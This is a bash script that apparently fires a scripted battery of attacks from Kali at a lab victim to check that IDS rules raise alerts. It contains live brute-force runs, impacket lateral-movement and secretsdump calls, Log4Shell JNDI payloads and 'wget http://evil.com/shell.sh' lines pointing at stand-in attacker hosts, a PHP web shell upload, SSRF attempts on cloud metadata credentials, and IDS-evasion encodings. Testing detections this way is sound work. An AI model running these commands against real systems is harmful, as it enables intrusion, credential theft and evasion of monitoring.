#!/bin/bash
# run_attacks.sh — Scripted attacks to run FROM Kali AGAINST the victim.
# Usage: ./run_attacks.sh <victim_private_ip>
set +e

VICTIM_IP="${1:?Usage: $0 <victim_private_ip>}"

echo "=== Starting attack simulation against ${VICTIM_IP} ==="

# ---------- Parallel background probe groups ----------
# The six groups below each block on a long operation (nmap scans, nikto
# cap, hydra brute-force, impacket lateral probes, nuclei CVE sweep,
# flightsim external traffic). They target independent services on the
# victim (or external destinations for flightsim) and have no data
# dependency on the fast-serial probes that follow — so fan them out as
# background subshells and `wait` at the end.
#
# Wall-clock: max(slowest group, fast-serial-remainder) ≈ 2-3 min vs. the
# ~6 min baseline when the whole battery was serial. Each subshell tees
# to its own log file so CI output stays readable after `wait` (the logs
# are dumped in a deterministic order via ::group::/::endgroup:: markers).
# verify_alerts.sh parses eve.json on the sensor — it doesn't care about
# this script's stdout ordering, so fanning out is safe.

LOGDIR="$(mktemp -d -t attack-parallel.XXXXXX)"

run_nmap_group() {
  echo "[BG/nmap] [1] ICMP ping sweep"
  ping -c 5 "${VICTIM_IP}" || true
  echo "[BG/nmap] [2] Nmap SYN scan (top 100 ports)"
  nmap -sS -T4 --top-ports 100 "${VICTIM_IP}" || true
  echo "[BG/nmap] [3] Nmap service/version detection"
  nmap -sV -T4 -p 22,80,443 "${VICTIM_IP}" || true
  echo "[BG/nmap] [4] Nmap OS detection"
  sudo nmap -O "${VICTIM_IP}" || true
  echo "[BG/nmap] [5] Nmap vulnerability scripts"
  nmap --script vuln -p 22,80 "${VICTIM_IP}" || true
  echo "[BG/nmap] [6] Nmap CVE detection (vulners)"
  nmap --script vulners -sV -p 22,80 "${VICTIM_IP}" || true
}

run_hydra_group() {
  echo "[BG/hydra] [10] SSH brute force attempts"
  # Feed hydra a real (small) password list so it generates >=15 ssh_auth_failed
  # events, which is the threshold Zeek's protocols/ssh/detect-bruteforcing uses
  # to raise SSH::Password_Guessing.
  PWLIST=$(mktemp)
  printf '%s\n' password 123456 admin root toor letmein qwerty welcome \
    admin123 changeme passw0rd monkey dragon master sunshine princess \
    football abc123 iloveyou trustno1 baseball >"$PWLIST"
  hydra -l admin -P "$PWLIST" -t 4 -w 5 -f "ssh://${VICTIM_IP}" 2>/dev/null || true
  rm -f "$PWLIST"
  for user in root admin test oracle postgres mysql; do
    ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=2 \
      "${user}@${VICTIM_IP}" 2>/dev/null || true
  done
}

run_nikto_group() {
  echo "[BG/nikto] [12] Nikto web scanner"
  nikto -h "http://${VICTIM_IP}" -maxtime 30 2>/dev/null || true
}

run_lateral_smb_group() {
  echo "[BG/lateral] [31] Lateral movement — SMB tree connects + named pipes"
  # Tree connect attempts to admin shares (denied by Samba but the SMB
  # exchange is visible to rules). timeout 10 — a firewalled 445 would
  # otherwise black-hole SYN and hang smbclient for ~75s.
  timeout 10 smbclient -N "//${VICTIM_IP}/ADMIN\$" -c 'ls' 2>/dev/null || true
  timeout 10 smbclient -N "//${VICTIM_IP}/C\$" -c 'ls' 2>/dev/null || true
  timeout 10 smbclient -N "//${VICTIM_IP}/IPC\$" -c 'help' 2>/dev/null || true
  timeout 10 impacket-psexec "administrator:wrongpass@${VICTIM_IP}" 'whoami' 2>/dev/null || true
  timeout 10 impacket-services "administrator:wrongpass@${VICTIM_IP}" list 2>/dev/null || true
  timeout 10 impacket-reg "administrator:wrongpass@${VICTIM_IP}" query -keyName HKLM\\SYSTEM 2>/dev/null || true
  timeout 10 impacket-samrdump "administrator:wrongpass@${VICTIM_IP}" 2>/dev/null || true
  timeout 10 impacket-atexec "administrator:wrongpass@${VICTIM_IP}" 'whoami' 2>/dev/null || true
  timeout 10 smbclient "//${VICTIM_IP}/lab" -N -c 'ls; put /etc/hostname exfil.txt' 2>/dev/null || true
  timeout 10 impacket-lookupsid "guest:@${VICTIM_IP}" 2>/dev/null || true
}

run_nuclei_group() {
  echo "[BG/nuclei] [34] nuclei CVE template sweep (Vulhub listeners + nginx)"
  if command -v nuclei >/dev/null 2>&1; then
    timeout 180 nuclei \
      -u "http://${VICTIM_IP}" \
      -u "http://${VICTIM_IP}:8080" \
      -u "http://${VICTIM_IP}:8983" \
      -tags cve,log4j,spring,solr \
      -rate-limit 30 -timeout 5 -silent -stats=false \
      -exclude-severity info,low \
      -o /tmp/nuclei-results.txt 2>/dev/null || true
    echo "  nuclei findings: $(wc -l < /tmp/nuclei-results.txt 2>/dev/null || echo 0)"
  else
    echo "  nuclei not installed; skipping"
  fi
}

run_flightsim_group() {
  echo "[BG/flightsim] [35] flightsim purpose-built IDS validator traffic"
  if command -v flightsim >/dev/null 2>&1; then
    # Modules are independent AlphaSOC probes hitting different destinations
    # — fan them out so wall-clock is max(module timeout) not sum.
    for mod in c2 dga tunnel-dns miner; do
      (echo "  flightsim run $mod"; timeout 90 flightsim run "$mod" 2>/dev/null) &
    done
    wait
  else
    echo "  flightsim not installed; skipping"
  fi
}

run_impacket_ad_chain_group() {
  # Exercises Kerberoast / AS-REP-roast / DCSync patterns via impacket wrappers
  # already installed by attacker_setup.sh. Victim is not AD-joined, so auth
  # attempts fail — but the SMB/DCE-RPC/Kerberos-port traffic that precedes
  # failure is what the rules match on (Zeek dce_rpc.log records SamrConnect,
  # LsarOpenPolicy2, etc. regardless of auth outcome).
  echo "[BG/impacket-ad] [40] AD enumeration via impacket (live over SMB/DCE-RPC)"
  cat >/tmp/adlab-users.txt <<EOF
Administrator
admin
guest
svc-sql
svc-backup
EOF
  timeout 20 impacket-GetNPUsers TESTDOM/ -usersfile /tmp/adlab-users.txt -no-pass -dc-ip "${VICTIM_IP}" 2>/dev/null || true
  timeout 20 impacket-GetUserSPNs -no-pass -dc-ip "${VICTIM_IP}" "TESTDOM/Administrator" 2>/dev/null || true
  timeout 20 impacket-secretsdump -no-pass -just-dc-ntlm "TESTDOM/Administrator@${VICTIM_IP}" 2>/dev/null || true
  timeout 20 impacket-lookupsid "guest@${VICTIM_IP}" -no-pass 2>/dev/null || true
}

run_doh_tunnel_group() {
  # DNS-over-HTTPS exfil to the three big public resolvers. Each resolver
  # has its own ET SNI-match rule; the wire-format (application/dns-message)
  # branch also tests that the detection doesn't key on the JSON API alone.
  echo "[BG/doh] [41] DNS-over-HTTPS exfil to public resolvers (JSON + wire-format)"
  for i in $(seq 1 5); do
    LABEL=$(head -c 30 /dev/urandom | base64 | tr -dc 'a-z0-9' | head -c 30)
    curl -sS --max-time 5 -H 'accept: application/dns-json' \
      "https://cloudflare-dns.com/dns-query?name=${LABEL}.example.com&type=A" >/dev/null 2>&1 || true
    curl -sS --max-time 5 -H 'accept: application/dns-json' \
      "https://dns.google/resolve?name=${LABEL}.example.com&type=A" >/dev/null 2>&1 || true
    curl -sS --max-time 5 -H 'accept: application/dns-message' \
      'https://dns.quad9.net/dns-query?dns=AAABAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB' >/dev/null 2>&1 || true
  done
}

run_cve_2024_sigbank_group() {
  # 2024+ edge-device CVE fingerprints. Victim doesn't host the real products
  # (TeamCity, ScreenConnect) — but the request-shape matches ET rules before
  # the server reply is examined, so the rules fire against plain nginx too.
  echo "[BG/cve2024] [42] 2024+ edge-device CVE signature replay"
  # CVE-2024-27198 TeamCity auth bypass via ;.jsp path traversal
  curl -sS --max-time 5 -XPOST "http://${VICTIM_IP}:8080/hax?jsp=/app/rest/users;.jsp" \
    -H 'Content-Type: application/xml' \
    -d '<user username="h" password="h" email="h@x" roles="ROLE_SYSTEM_ADMIN"/>' >/dev/null 2>&1 || true
  # CVE-2024-1709 ScreenConnect SetupWizard auth bypass
  curl -sS --max-time 5 "http://${VICTIM_IP}/SetupWizard.aspx/SetupCompleted" >/dev/null 2>&1 || true
  curl -sS --max-time 5 "http://${VICTIM_IP}/SetupWizard.aspx/anything" >/dev/null 2>&1 || true
}

run_http2_evasion_group() {
  # HTTP/2 prior-knowledge (h2c) against a plain-HTTP/1 nginx triggers
  # Suricata's applayer-mismatch + http2-frame decoder events, and
  # produces unknown_HTTP_method / bad_HTTP_request / line_terminated_with_
  # single_CR entries in Zeek weird.log. Useful because CI's battery didn't
  # previously exercise any HTTP/2 path.
  echo "[BG/http2] [43] HTTP/2 prior-knowledge + smuggling-shape probes"
  curl -sS --max-time 5 --http2-prior-knowledge "http://${VICTIM_IP}/" \
    -H 'User-Agent: ${jndi:ldap://attacker:1389/a}' >/dev/null 2>&1 || true
  curl -sS --max-time 5 --http2-prior-knowledge -XPOST "http://${VICTIM_IP}/" \
    -H 'Content-Length: 0' -H 'Transfer-Encoding: chunked' \
    --data 'SMUGGLED_BODY_GET /admin HTTP/1.1' >/dev/null 2>&1 || true
}

run_cryptominer_live_group() {
  # Live cryptominer fingerprints: (a) TLS SNI to a pool that ET flags as a
  # CoinMiner domain (supportxmr.com), (b) a stratum-protocol login JSON
  # to the pool's stratum port 3333 which fires ET INFO Cryptocurrency
  # Miner Checkin. Neither needs auth or an account — both fire on the
  # shape of the traffic alone. Added after live-lab validation in wave 2.
  echo "[BG/cryptominer] [45] Cryptominer pool SNI + stratum login JSON"
  # (a) SNI hit — ET MALWARE CoinMiner supportxmr SNI
  curl -sS --max-time 5 "https://pool.supportxmr.com/" -k -o /dev/null -w "" 2>&1 || true
  # (b) stratum login JSON to :3333 — ET INFO Cryptocurrency Miner Checkin
  printf '{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"41ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuv","pass":"x","agent":"XMRig/6.21.0","algo":["rx/0"]}}\n' \
    | timeout 3 nc pool.supportxmr.com 3333 2>/dev/null | head -1 || true
}

run_saas_c2_exfil_group() {
  # TLS-SNI-based exfil/C2 destinations. Each host has at least one ET
  # INFO/HUNTING rule that matches on SNI alone, so we don't need the
  # endpoint to exist or the auth to succeed. Mix of messaging APIs,
  # file-drop services, webhook inspectors, tunneling relays, and
  # package-hosting infrastructure.
  echo "[BG/saas-c2] [44] SaaS/webhook/tunnel SNI exfil destinations"
  EXFIL='{"stolen":"fake","host":"test"}'
  curl -sS --max-time 5 "https://api.telegram.org/bot1234567890:AAHfake/sendMessage?chat_id=1&text=x" >/dev/null 2>&1 || true
  curl -sS --max-time 5 -XPOST "https://content.dropboxapi.com/2/files/upload" \
    -H 'Authorization: Bearer fake' --data "$EXFIL" >/dev/null 2>&1 || true
  for host in webhook.site a.free.beeceptor.com pipedream.com; do
    curl -sS --max-time 5 "https://$host/" >/dev/null 2>&1 || true
  done
  for host in ngrok-free.app trycloudflare.com serveo.net; do
    curl -sS --max-time 5 "https://$host/" >/dev/null 2>&1 || true
  done
  curl -sS --max-time 5 "https://files.pythonhosted.org/packages/source/a/fake-pkg/fake-pkg-1.0.tar.gz" >/dev/null 2>&1 || true
}

run_nmap_group             > "$LOGDIR/nmap.log"        2>&1 & NMAP_PID=$!
run_hydra_group            > "$LOGDIR/hydra.log"       2>&1 & HYDRA_PID=$!
run_nikto_group            > "$LOGDIR/nikto.log"       2>&1 & NIKTO_PID=$!
run_lateral_smb_group      > "$LOGDIR/lateral.log"     2>&1 & LATERAL_PID=$!
run_nuclei_group           > "$LOGDIR/nuclei.log"      2>&1 & NUCLEI_PID=$!
run_flightsim_group        > "$LOGDIR/flightsim.log"   2>&1 & FLIGHTSIM_PID=$!
run_impacket_ad_chain_group > "$LOGDIR/impacket-ad.log" 2>&1 & IMPACKET_AD_PID=$!
run_doh_tunnel_group       > "$LOGDIR/doh.log"         2>&1 & DOH_PID=$!
run_cve_2024_sigbank_group > "$LOGDIR/cve2024.log"     2>&1 & CVE2024_PID=$!
run_http2_evasion_group    > "$LOGDIR/http2.log"       2>&1 & HTTP2_PID=$!
run_saas_c2_exfil_group    > "$LOGDIR/saas-c2.log"     2>&1 & SAAS_C2_PID=$!
run_cryptominer_live_group > "$LOGDIR/cryptominer.log" 2>&1 & CRYPTOMINER_PID=$!

echo "=== 12 background probe groups launched; running fast serial probes inline ==="

# ---------- Web Application Attacks ----------

echo "[7/13] Web attacks against nginx"

# SQL injection attempts
curl -s -o /dev/null -w "%{http_code}" "http://${VICTIM_IP}/?id=1%27%20OR%201%3D1--" || true
curl -s -o /dev/null -w "%{http_code}" "http://${VICTIM_IP}/?id=1%20UNION%20SELECT%20username,password%20FROM%20users--" || true
curl -s -o /dev/null -w "%{http_code}" "http://${VICTIM_IP}/login?user=admin'%20OR%20'1'='1" || true

# Directory traversal
curl -s -o /dev/null -w "%{http_code}" "http://${VICTIM_IP}/../../../../etc/passwd" || true
curl -s -o /dev/null -w "%{http_code}" "http://${VICTIM_IP}/..%2f..%2f..%2f..%2fetc%2fpasswd" || true

# XSS attempts
curl -s -o /dev/null -w "%{http_code}" "http://${VICTIM_IP}/?q=<script>alert(document.cookie)</script>" || true
curl -s -o /dev/null -w "%{http_code}" "http://${VICTIM_IP}/?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E" || true

# Shellshock
curl -s -o /dev/null -A "() { :; }; /bin/bash -c 'cat /etc/passwd'" "http://${VICTIM_IP}/" || true

# Suspicious user agents
curl -s -o /dev/null -A "Nmap Scripting Engine" "http://${VICTIM_IP}/" || true
curl -s -o /dev/null -A "sqlmap/1.0" "http://${VICTIM_IP}/" || true
curl -s -o /dev/null -A "nikto" "http://${VICTIM_IP}/" || true
curl -s -o /dev/null -A "DirBuster" "http://${VICTIM_IP}/" || true

# Probe for common sensitive files
curl -s -o /dev/null "http://${VICTIM_IP}/wp-admin/" || true
curl -s -o /dev/null "http://${VICTIM_IP}/phpmyadmin/" || true
curl -s -o /dev/null "http://${VICTIM_IP}/.env" || true
curl -s -o /dev/null "http://${VICTIM_IP}/server-status" || true
curl -s -o /dev/null "http://${VICTIM_IP}/config.php" || true

# ---------- CVE Exploit Simulations (2021-2025) ----------

echo "[8/13] CVE exploit simulations"

# Log4Shell (CVE-2021-44228) — JNDI injection in HTTP headers
curl -s -o /dev/null -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}' "http://${VICTIM_IP}/" || true
curl -s -o /dev/null -H 'User-Agent: ${jndi:ldap://attacker.com/exploit}' "http://${VICTIM_IP}/" || true
curl -s -o /dev/null -H 'Referer: ${jndi:ldap://evil.com/callback}' "http://${VICTIM_IP}/" || true
curl -s -o /dev/null "http://${VICTIM_IP}/?x=\${jndi:ldap://attacker.com/a}" || true

# Spring4Shell (CVE-2022-22965) — class loader manipulation
curl -s -o /dev/null "http://${VICTIM_IP}/?class.module.classLoader.URLs%5B0%5D=0" || true
curl -s -o /dev/null -X POST -d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di' "http://${VICTIM_IP}/" || true

# Confluence RCE (CVE-2023-22527) — OGNL injection
curl -s -o /dev/null -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'label=\u0027%2b#request[\u0027.KEY\u0027]%2b\u0027' "http://${VICTIM_IP}/template/aui/text-inline.vm" || true

# MOVEit Transfer SQLi (CVE-2023-34362)
curl -s -o /dev/null "http://${VICTIM_IP}/moveitisapi/moveitisapi.dll?action=m2" || true
curl -s -o /dev/null "http://${VICTIM_IP}/guestaccess.aspx?cmd=login" || true

# Apache path traversal (CVE-2021-41773 / CVE-2021-42013)
curl -s -o /dev/null "http://${VICTIM_IP}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" || true
curl -s -o /dev/null "http://${VICTIM_IP}/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd" || true

# Citrix NetScaler RCE (CVE-2023-3519)
curl -s -o /dev/null -X POST "http://${VICTIM_IP}/gwtest/formssso?event=start&target=notexist" || true

# FortiOS SSLVPN path traversal (CVE-2018-13379)
curl -s -o /dev/null "http://${VICTIM_IP}/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" || true

# React Server Components RCE (CVE-2025-55182)
curl -s -o /dev/null -X POST -H 'Content-Type: text/x-component' \
  -d '0:{"id":"exploit","chunks":[],"name":"eval"}' "http://${VICTIM_IP}/" || true

# VMware vCenter RCE (CVE-2021-21972)
curl -s -o /dev/null "http://${VICTIM_IP}/ui/vropspluginui/rest/services/uploadova" || true

# ProxyShell (CVE-2021-34473)
curl -s -o /dev/null "http://${VICTIM_IP}/autodiscover/autodiscover.json?@zdi/PowerShell" || true

# ---------- IDS Test Rule ----------

echo "[9/13] IDS test (testmyids.com)"
curl -s "http://testmyids.com/" || true

# ---------- SSH Brute Force: moved to background group run_hydra_group ----------

# ---------- DNS Flood ----------

echo "[11/13] DNS lookup flood (simulates tunneling)"
for i in $(seq 1 20); do
  dig @1.1.1.1 "$(head -c 20 /dev/urandom | xxd -p).test.example.com" +short 2>/dev/null || true
done

# ---------- Nikto Web Scanner: moved to background group run_nikto_group ----------

# ---------- Command Injection Patterns ----------

echo "[13/18] Command injection patterns in HTTP"
curl -s -o /dev/null "http://${VICTIM_IP}/cgi-bin/test?cmd=cat%20/etc/passwd" || true
curl -s -o /dev/null "http://${VICTIM_IP}/cgi-bin/test?cmd=id;uname%20-a" || true
curl -s -o /dev/null -X POST -d 'cmd=wget http://evil.com/shell.sh' "http://${VICTIM_IP}/" || true
curl -s -o /dev/null -X POST -d '<?php system($_GET["cmd"]); ?>' "http://${VICTIM_IP}/upload.php" || true
curl -s -o /dev/null -X POST -H 'Content-Type: application/json' \
  -d '{"__proto__":{"polluted":"yes"}}' "http://${VICTIM_IP}/api" || true

# ---------- Recent 2024-2025 CVEs ----------

echo "[14/18] Recent CVE exploit simulations (2024-2025)"

# CVE-2024-3400 Palo Alto PAN-OS GlobalProtect command injection
curl -s -o /dev/null -H "Cookie: SESSID=../../../../opt/panlogs/tmp/device_telemetry/minute/attack.txt" \
  "http://${VICTIM_IP}/global-protect/login.esp" || true

# CVE-2024-47176 CUPS printer daemon RCE (IPP protocol)
curl -s -o /dev/null -X POST -H "Content-Type: application/ipp" \
  --data-binary $'\x02\x00\x00\x0b\x00\x00\x00\x01' "http://${VICTIM_IP}:631/printers/exploit" || true

# CVE-2025-0282 Ivanti Connect Secure stack overflow
curl -s -o /dev/null -H "HTTP_WEBVPN: $(perl -e 'print "A"x5000' 2>/dev/null)" \
  "http://${VICTIM_IP}/dana-na/auth/url_default/welcome.cgi" || true

# CVE-2024-55956 Cleo LexiCom file upload RCE (used by Cl0p ransomware)
curl -s -o /dev/null -X POST --data-binary '@/dev/null' \
  "http://${VICTIM_IP}/Synchronization?action=addFile&file=../autorun/exploit.bat" || true

# CVE-2024-4577 PHP-CGI argument injection
curl -s -o /dev/null "http://${VICTIM_IP}/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" \
  -d '<?php echo system("id"); ?>' || true

# CVE-2024-24919 Check Point arbitrary file read
curl -s -o /dev/null -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'aCSHELL/../../../../../../../etc/shadow' "http://${VICTIM_IP}/clients/MyCRL" || true

# CVE-2023-46604 Apache ActiveMQ RCE
curl -s -o /dev/null -X POST -d '<?xml version="1.0"?><beans><bean class="java.lang.ProcessBuilder"><constructor-arg><list><value>whoami</value></list></constructor-arg></bean></beans>' \
  "http://${VICTIM_IP}/" || true

# ---------- SSRF to AWS Instance Metadata ----------

echo "[15/18] SSRF attempts targeting instance metadata"

# Classic IMDSv1 exploitation attempts
curl -s -o /dev/null "http://${VICTIM_IP}/?url=http://169.254.169.254/latest/meta-data/" || true
curl -s -o /dev/null "http://${VICTIM_IP}/fetch?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/" || true
curl -s -o /dev/null "http://${VICTIM_IP}/proxy?uri=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F" || true
curl -s -o /dev/null "http://${VICTIM_IP}/api/fetch?url=http://[::ffff:169.254.169.254]/latest/meta-data/" || true

# Cloud-specific metadata endpoints
curl -s -o /dev/null "http://${VICTIM_IP}/?redirect=http://metadata.google.internal/computeMetadata/v1/" || true
curl -s -o /dev/null "http://${VICTIM_IP}/?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" || true

# Internal network SSRF
curl -s -o /dev/null "http://${VICTIM_IP}/?url=http://127.0.0.1:22" || true
curl -s -o /dev/null "http://${VICTIM_IP}/?url=http://localhost:6379/" || true
curl -s -o /dev/null "http://${VICTIM_IP}/?url=file:///etc/passwd" || true
curl -s -o /dev/null "http://${VICTIM_IP}/?url=gopher://127.0.0.1:25/xHELO" || true

# ---------- DNS Tunneling Patterns ----------

echo "[16/18] DNS tunneling simulation (iodine/dnscat2 patterns)"

# Long subdomain queries typical of DNS tunneling
for i in $(seq 1 15); do
  PAYLOAD=$(head -c 40 /dev/urandom | xxd -p | tr -d '\n' | head -c 60)
  dig @1.1.1.1 "${PAYLOAD}.tunnel.example.com" +short 2>/dev/null || true
done

# TXT record queries (common for exfiltration)
for i in $(seq 1 10); do
  dig @1.1.1.1 TXT "data$(head -c 10 /dev/urandom | xxd -p).exfil.example.com" +short 2>/dev/null || true
done

# Suspicious TLDs
dig @1.1.1.1 "$(date +%s).malware.tk" +short 2>/dev/null || true
dig @1.1.1.1 "cmd.c2.xyz" +short 2>/dev/null || true
dig @1.1.1.1 "beacon.darkside.onion" +short 2>/dev/null || true

# Zone transfer attempt (victim has no DNS — timeout 10 to prevent 45s dig retry loop)
timeout 10 dig @${VICTIM_IP} example.com AXFR 2>/dev/null || true

# ---------- Credential Attacks ----------

echo "[17/18] Credential attacks (SMB, LDAP, Telnet, FTP)"

# SMB probe/enumeration
nmap --script smb-enum-shares,smb-vuln-ms17-010 -p 445 "${VICTIM_IP}" 2>/dev/null || true

# SMB brute force (will fail fast, generates detection traffic)
hydra -l Administrator -P /dev/null -t 4 -w 3 -f "smb://${VICTIM_IP}" 2>/dev/null || true

# FTP brute force
hydra -l anonymous -p anonymous -t 4 -w 3 -f "ftp://${VICTIM_IP}" 2>/dev/null || true

# Telnet connection attempts (triggers ancient-protocol rules)
for i in 1 2 3; do
  timeout 2 bash -c "exec 3<>/dev/tcp/${VICTIM_IP}/23 && echo 'admin' >&3 && echo 'password' >&3" 2>/dev/null || true
done

# RDP brute force
hydra -l Administrator -P /dev/null -t 4 -w 3 -f "rdp://${VICTIM_IP}" 2>/dev/null || true

# LDAP anonymous bind attempt
curl -s -o /dev/null "ldap://${VICTIM_IP}/" 2>/dev/null || true

# ---------- Malware C2 Simulation ----------

echo "[18/29] Malware C2 traffic simulation"

# Cobalt Strike beacon URI patterns
curl -s -o /dev/null "http://${VICTIM_IP}/submit.php?id=$(head -c 8 /dev/urandom | xxd -p)" || true
curl -s -o /dev/null -A "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" \
  "http://${VICTIM_IP}/cm/jquery-3.3.1.min.js" || true

# Meterpreter default URI patterns
curl -s -o /dev/null "http://${VICTIM_IP}/INITM" || true
curl -s -o /dev/null "http://${VICTIM_IP}/A" -H "User-Agent: Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)" || true

# Empire / PowerShell Empire C2 patterns
curl -s -o /dev/null -A "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" \
  "http://${VICTIM_IP}/login/process.php" || true
curl -s -o /dev/null "http://${VICTIM_IP}/admin/get.php?k=$(head -c 16 /dev/urandom | xxd -p)" || true

# Sliver C2 framework HTTP patterns
curl -s -o /dev/null "http://${VICTIM_IP}/static/assets/app.js?_=$(date +%s)" || true

# Mythic C2 framework
curl -s -o /dev/null -H "Accept: text/html,application/xhtml+xml" \
  "http://${VICTIM_IP}/api/v1.4/agent_message" || true

# Malware download patterns (known bad URLs)
curl -s -o /dev/null "http://${VICTIM_IP}/loader.exe" || true
curl -s -o /dev/null "http://${VICTIM_IP}/payload.dll" || true
curl -s -o /dev/null "http://${VICTIM_IP}/stage2.ps1" || true

# Crypto mining (XMRig)
curl -s -o /dev/null -A "XMRig/6.19.0" "http://${VICTIM_IP}/" || true

# Stratum mining protocol probe
timeout 2 bash -c "exec 3<>/dev/tcp/${VICTIM_IP}/3333 && echo '{\"id\":1,\"method\":\"mining.subscribe\",\"params\":[]}' >&3" 2>/dev/null || true

# ---------- Evasion Techniques (NSS/CyberRatings style) ----------

echo "[19/29] IDS evasion techniques"

# IP fragmentation — split packets to evade signature matching
sudo hping3 -f -p 80 -c 5 "${VICTIM_IP}" 2>/dev/null || true
sudo nmap -f -sS -p 22,80 "${VICTIM_IP}" 2>/dev/null || true

# Double URL encoding (%25 = %, so %252e decodes twice to .)
curl -s -o /dev/null "http://${VICTIM_IP}/%252e%252e%252f%252e%252e%252fetc/passwd" || true
curl -s -o /dev/null "http://${VICTIM_IP}/?q=%2527%2520OR%25201%253D1--" || true

# Triple URL encoding (extreme evasion)
curl -s -o /dev/null "http://${VICTIM_IP}/%25252e%25252e/etc/passwd" || true

# Case randomization (SQL injection bypass)
curl -s -o /dev/null "http://${VICTIM_IP}/?id=1%20UnIoN%20SeLeCt%20username,password%20FrOm%20users--" || true
curl -s -o /dev/null "http://${VICTIM_IP}/?q=<ScRiPt>alert(1)</sCrIpT>" || true

# Unicode/full-width character bypass — use -G so payload goes in URI
# (where http.uri sticky buffer / rule 9000203 looks for it). Also send
# the raw UTF-8 directly in the path for an additional code path.
curl -s -o /dev/null -G --data-urlencode 'q=ＳＥＬＥＣＴ＊ＦＲＯＭ' "http://${VICTIM_IP}/" || true
curl -s -o /dev/null -G --data-urlencode 'path=．．／．．／etc／passwd' "http://${VICTIM_IP}/" || true
curl -s -o /dev/null "http://${VICTIM_IP}/$(printf '\xef\xbc\x8e\xef\xbc\x8e\xef\xbc\x8fetc\xef\xbc\x8fpasswd')" || true

# HTTP chunked encoding abuse
curl -s -o /dev/null -X POST -H "Transfer-Encoding: chunked" \
  --data-binary $'5\r\nhello\r\n0\r\n\r\n' "http://${VICTIM_IP}/" || true

# Oversized/malformed headers
curl -s -o /dev/null -H "X-Custom: $(head -c 4000 /dev/urandom | base64 | tr -d '\n' | head -c 4000)" \
  "http://${VICTIM_IP}/" || true

# SNI vs Host header mismatch (HTTPS spoofing simulation)
curl -s -o /dev/null --resolve "fake.evil.com:80:${VICTIM_IP}" -H "Host: legitimate.com" \
  "http://fake.evil.com/" || true

# HTTP request smuggling attempts (CL.TE desync)
curl -s -o /dev/null -X POST \
  -H "Content-Length: 11" -H "Transfer-Encoding: chunked" \
  --data-binary $'0\r\n\r\nGET /smug HTTP/1.1\r\nHost: evil.com\r\n\r\n' \
  "http://${VICTIM_IP}/" || true

# Header value splitting (CRLF injection)
curl -s -o /dev/null "http://${VICTIM_IP}/?cookie=user%0d%0aSet-Cookie:%20admin=true" || true

# TCP segmentation via nmap (split SYN packets)
sudo nmap --mtu 16 -sS -p 80 "${VICTIM_IP}" 2>/dev/null || true

# HTTP header case variations (bypass header-matching rules)
curl -s -o /dev/null -H "user-AGENT: () { :; }; echo vulnerable" "http://${VICTIM_IP}/" || true

# Comment injection in URLs
curl -s -o /dev/null "http://${VICTIM_IP}/?id=1/*comment*/UNION/*evasion*/SELECT" || true

# Nested encoding (URL + HTML entities)
curl -s -o /dev/null "http://${VICTIM_IP}/?q=%26%2360%3Bscript%26%2362%3B" || true

# ---------- Malware Block Rate Simulation ----------

echo "[20/29] Malware and phishing simulation"

# EICAR test string in HTTP POST (antivirus test signature)
curl -s -o /dev/null -X POST --data 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' \
  "http://${VICTIM_IP}/upload" || true

# EICAR via URL
curl -s -o /dev/null "http://${VICTIM_IP}/test?payload=X5O%21P%25%40AP%5B4%5CPZX54%28P%5E%297CC%297%7D%24EICAR-STANDARD-ANTIVIRUS-TEST-FILE%21%24H%2BH%2A" || true

# Known malware download patterns
curl -s -o /dev/null "http://${VICTIM_IP}/emotet.exe" || true
curl -s -o /dev/null "http://${VICTIM_IP}/trickbot.dll" || true
curl -s -o /dev/null "http://${VICTIM_IP}/ursnif.exe" || true
curl -s -o /dev/null "http://${VICTIM_IP}/qakbot.zip" || true

# PowerShell download cradles (common malware delivery)
curl -s -o /dev/null -A "Mozilla/5.0" \
  "http://${VICTIM_IP}/IEX(New-Object%20Net.WebClient).DownloadString" || true
curl -s -o /dev/null -A "Mozilla/5.0" \
  "http://${VICTIM_IP}/?cmd=powershell%20-enc%20SQBFAFgAIABJAE4AVg" || true

# Ransomware C2 beacon patterns
# Conti ransomware callback pattern
curl -s -o /dev/null -A "Mozilla/4.0 (compatible)" \
  "http://${VICTIM_IP}/api/v1/status?uid=$(head -c 16 /dev/urandom | xxd -p)" || true
# LockBit pattern
curl -s -o /dev/null "http://${VICTIM_IP}/upload.php?id=victim_$(date +%s)" || true
# REvil / Sodinokibi
curl -s -o /dev/null "http://${VICTIM_IP}/wp-content/plugins/update.php?v=1" || true

# Phishing kit paths
curl -s -o /dev/null "http://${VICTIM_IP}/office365/login.html" || true
curl -s -o /dev/null "http://${VICTIM_IP}/wellsfargo/signin.htm" || true
curl -s -o /dev/null "http://${VICTIM_IP}/paypal-verify/" || true

# Suspicious file extensions (double extensions)
curl -s -o /dev/null "http://${VICTIM_IP}/invoice.pdf.exe" || true
curl -s -o /dev/null "http://${VICTIM_IP}/document.doc.js" || true
curl -s -o /dev/null "http://${VICTIM_IP}/photo.jpg.scr" || true

# Shellcode-like base64 payloads in POST
curl -s -o /dev/null -X POST --data 'payload=/OiJAAAAAGMYAH7rGoAg8f5nVfSzn+m9XGfCa2aBMNZi+XMtMoCH+P/AVw==' \
  "http://${VICTIM_IP}/api/process" || true

# Known bad domains referenced in requests
